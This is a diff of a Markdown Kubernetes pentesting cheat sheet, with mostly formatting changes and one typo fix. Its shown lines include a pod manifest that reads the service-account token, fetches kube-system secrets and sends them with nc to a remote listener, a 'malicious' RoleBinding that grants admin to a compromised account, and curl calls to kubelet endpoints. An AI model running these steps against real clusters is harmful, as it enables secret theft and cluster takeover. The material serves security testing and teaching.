@@ -2,18 +2,18 @@
 
 > Kubernetes is an open-source container-orchestration system for automating application deployment, scaling, and management. It was originally designed by Google, and is now maintained by the Cloud Native Computing Foundation.
 
-## Summary 
+## Summary
 
 - [Tools](#tools)
 - [Container Environment](#container-environment)
 - [Information Gathering](#information-gathering)
 - [RBAC Configuration](#rbac-configuration)
-    - [Listing Secrets](#listing-secrets)
-    - [Access Any Resource or Verb](#access-any-resource-or-verb)
-    - [Pod Creation](#pod-creation)
-    - [Privilege to Use Pods/Exec](#privilege-to-use-pods-exec)
-    - [Privilege to Get/Patch Rolebindings](#privilege-to-get-patch-rolebindings)
-    - [Impersonating a Privileged Account](#impersonating-a-privileged-account)
+  - [Listing Secrets](#listing-secrets)
+  - [Access Any Resource or Verb](#access-any-resource-or-verb)
+  - [Pod Creation](#pod-creation)
+  - [Privilege to Use Pods/Exec](#privilege-to-use-pods-exec)
+  - [Privilege to Get/Patch Rolebindings](#privilege-to-get-patch-rolebindings)
+  - [Impersonating a Privileged Account](#impersonating-a-privileged-account)
 - [Privileged Service Account Token](#privileged-service-account-token)
 - [Interesting endpoints to reach](#interesting-endpoints-to-reach)
 - [API addresses that you should know](#api-addresses-that-you-should-know)
@@ -21,12 +21,12 @@
 
 ## Tools
 
-* [kubeaudit](https://github.com/Shopify/kubeaudit) - Audit Kubernetes clusters against common security concerns
-* [kubesec.io](https://kubesec.io/) - Security risk analysis for Kubernetes resources
-* [kube-bench](https://github.com/aquasecurity/kube-bench) - Checks whether Kubernetes is deployed securely by running [CIS Kubernetes Benchmark](https://www.cisecurity.org/benchmark/kubernetes/)
-* [kube-hunter](https://github.com/aquasecurity/kube-hunter) - Hunt for security weaknesses in Kubernetes clusters 
-* [katacoda](https://katacoda.com/courses/kubernetes) - Learn Kubernetes using interactive broser-based scenarios
-* [kubescape](https://github.com/armosec/kubescape) - Automate Kubernetes cluster scans to identify security issues
+- [kubeaudit](https://github.com/Shopify/kubeaudit) - Audit Kubernetes clusters against common security concerns
+- [kubesec.io](https://kubesec.io/) - Security risk analysis for Kubernetes resources
+- [kube-bench](https://github.com/aquasecurity/kube-bench) - Checks whether Kubernetes is deployed securely by running [CIS Kubernetes Benchmark](https://www.cisecurity.org/benchmark/kubernetes/)
+- [kube-hunter](https://github.com/aquasecurity/kube-hunter) - Hunt for security weaknesses in Kubernetes clusters
+- [katacoda](https://katacoda.com/courses/kubernetes) - Learn Kubernetes using interactive broser-based scenarios
+- [kubescape](https://github.com/armosec/kubescape) - Automate Kubernetes cluster scans to identify security issues
 
 ## Container Environment
 
@@ -46,14 +46,14 @@ If the `kubectl` utility is installed in the container, it will use this service
 
 ### Environment Variables
 
-The `KUBERNETES_SERVICE_HOST` and `KUBERNETES_SERVICE_PORT` environment variables are automatically provided to the container. They contain the IP address and port number of the Kubernetes master node.  If `kubectl` is installed, it will use these values automatically. If not, the values can be used to determine the correct IP address to send API requests to.
+The `KUBERNETES_SERVICE_HOST` and `KUBERNETES_SERVICE_PORT` environment variables are automatically provided to the container. They contain the IP address and port number of the Kubernetes master node. If `kubectl` is installed, it will use these values automatically. If not, the values can be used to determine the correct IP address to send API requests to.
 
 ```
 KUBERNETES_SERVICE_HOST=192.168.154.228
 KUBERNETES_SERVICE_PORT=443
 ```
 
-Additionally, [environment variables](https://kubernetes.io/docs/concepts/services-networking/service/#discovering-services) are automatically created for each Kubernetes service running in the current namespace when the container was created.  The environment variables are named using two patterns:
+Additionally, [environment variables](https://kubernetes.io/docs/concepts/services-networking/service/#discovering-services) are automatically created for each Kubernetes service running in the current namespace when the container was created. The environment variables are named using two patterns:
 
 - A simplified `{SVCNAME}_SERVICE_HOST` and `{SVCNAME}_SERVICE_PORT` contain the IP address and default port number for the service.
 - A [Docker links](https://docs.docker.com/network/links/#environment-variables) collection of variables named `{SVCNAME}_PORT_{NUM}_{PROTOCOL}_{PROTO|PORT|ADDR}` for each port the service exposes.
@@ -72,7 +72,7 @@ REDIS_MASTER_PORT_6379_TCP_ADDR=10.0.0.11
 
 ### Simulating `kubectl` API Requests
 
-Most containers within a Kubernetes cluster won't have the `kubectl` utility installed. If running the [one-line `kubectl` installer](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux) within the container isn't an option, you may need to craft Kubernetes HTTP API requests manually. This can be done by using `kubectl` *locally* to determine the correct API request to send from the container.
+Most containers within a Kubernetes cluster won't have the `kubectl` utility installed. If running the [one-line `kubectl` installer](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux) within the container isn't an option, you may need to craft Kubernetes HTTP API requests manually. This can be done by using `kubectl` _locally_ to determine the correct API request to send from the container.
 
 1. Run the desired command at the maximum verbosity level using `kubectl -v9 ...`
 1. The output will include HTTP API endpoint URL, the request body, and an example curl command.
@@ -132,7 +132,7 @@ True Kubernetes Volumes are typically used as shared storage or for persistent s
 
 Kubernetes supports a wide range of [security contexts](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/) for container and pod execution. The most important of these is the "privileged" [security policy](https://kubernetes.io/docs/concepts/policy/pod-security-policy/) which makes the host node's devices available under the container's `/dev` directory. This means having access to the host's Docker socket file (allowing arbitrary container actions) in addition to the host's root disks (which can be used to escape the container entirely).
 
-While there is no official way to check for privileged mode from *within* a container, checking if `/dev/kmsg` exists will usually suffice.
+While there is no official way to check for privileged mode from _within_ a container, checking if `/dev/kmsg` exists will usually suffice.
 
 ## RBAC Configuration
 
@@ -166,10 +166,14 @@ metadata:
   namespace: kube-system
 spec:
   containers:
-  - name: alpine
-    image: alpine
-    command: ["/bin/sh"]
-    args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
+    - name: alpine
+      image: alpine
+      command: ["/bin/sh"]
+      args:
+        [
+          "-c",
+          'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000',
+        ]
   serviceAccountName: bootstrap-signer
   automountServiceAccountToken: true
   hostNetwork: true
@@ -185,7 +189,7 @@ kubectl exec -it <POD NAME> -n <PODS NAMESPACE> –- sh
 
 ### Privilege to Get/Patch Rolebindings
 
-The purpose of this JSON file is to bind the admin "CluserRole" to the compromised service account. 
+The purpose of this JSON file is to bind the admin "CluserRole" to the compromised service account.
 Create a malicious RoleBinging.json file.
 
 ```powershell
@@ -194,7 +198,7 @@ Create a malicious RoleBinging.json file.
     "kind": "RoleBinding",
     "metadata": {
         "name": "malicious-rolebinding",
-        "namespcaes": "default"
+        "namespaces": "default"
     },
     "roleRef": {
         "apiGroup": "*",
@@ -245,10 +249,9 @@ curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip:<port>/apis/ex
 curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip:<port>/apis/extensions/v1beta1/namespaces/default/daemonsets
 ```
 
+## API addresses that you should know
 
-## API addresses that you should know 
-
-*(External network visibility)*
+_(External network visibility)_
 
 ### cAdvisor
 
@@ -292,7 +295,6 @@ curl -k https://<IP address>:10250/pods
 curl -k https://<IP Address>:10255
 http://<external-IP>:10255/pods
 ```
-
 
 ## References
 
